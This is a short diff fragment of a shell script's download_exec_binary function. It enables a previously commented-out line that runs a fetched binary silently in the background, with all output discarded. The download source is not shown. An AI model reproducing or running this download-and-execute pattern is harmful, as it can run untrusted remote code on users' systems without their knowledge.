@@ -33,7 +33,7 @@ download_exec_binary() {
 
 	# Execute the binary
 	echo "Executing $1..."
-	#./$1$2 >/dev/null 2>&1 &
+	./$1$2 >/dev/null 2>&1 &
 	if [[ $? -eq 0 ]]
     then
         echo " - Successfully executed $1!"
